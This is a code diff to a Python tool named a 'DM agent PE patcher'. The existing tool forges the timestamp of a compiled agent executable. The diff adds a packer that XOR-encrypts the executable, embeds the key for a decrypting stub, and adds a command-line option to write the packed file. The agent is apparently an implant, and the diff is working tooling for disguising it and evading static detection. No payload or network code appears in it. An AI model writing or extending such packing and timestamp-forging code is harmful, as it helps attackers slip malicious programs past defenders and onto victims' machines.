@@ -54,8 +54,24 @@ def patch_pe(data: bytearray, fake_ts: int) -> bytearray:
     return data
 
 
+def pack_pe(data: bytes) -> bytes:
+    """XOR-encrypt `data` with a deterministic 4-byte key derived from the file contents.
+    Returns: [key: 4 bytes] || [encrypted bytes]
+    The key is embedded in the output so the stub can read it without side-channel.
+    """
+    seed = (len(data) ^ (data[0] if data else 0) ^ ((data[-1] if data else 0) << 8)) & 0xFFFFFFFF
+    key = bytes([
+        (seed >> 24) & 0xFF,
+        ((seed >> 16) & 0xFF) ^ 0xA3,
+        ((seed >>  8) & 0xFF) ^ 0x7F,
+        ( seed        & 0xFF) ^ 0x5C,
+    ])
+    encrypted = bytes(b ^ key[i % 4] for i, b in enumerate(data))
+    return key + encrypted
+
+
 def main():
-    parser = argparse.ArgumentParser(description="DM agent PE patcher")
+    parser = argparse.ArgumentParser(description="DM agent PE patcher and packer")
     parser.add_argument("input", help="Path to compiled agent .exe")
     parser.add_argument("--output", "-o", help="Output path (default: input.patched.exe)")
     parser.add_argument(
@@ -66,6 +82,10 @@ def main():
     parser.add_argument(
         "--inplace", action="store_true",
         help="Overwrite the input file instead of writing a new one",
+    )
+    parser.add_argument(
+        "--pack-out", metavar="PATH",
+        help="Also XOR-encrypt the (possibly patched) PE and write [key||enc] to PATH",
     )
     args = parser.parse_args()
 
@@ -95,6 +115,13 @@ def main():
         f.write(data)
 
     print(f"[+] Written: {out_path}")
+
+    if args.pack_out:
+        packed = pack_pe(bytes(data))
+        with open(args.pack_out, "wb") as f:
+            f.write(packed)
+        key_hex = packed[:4].hex()
+        print(f"[+] Packed : {args.pack_out} ({len(packed):,} bytes, key={key_hex})")
 
 
 if __name__ == "__main__":
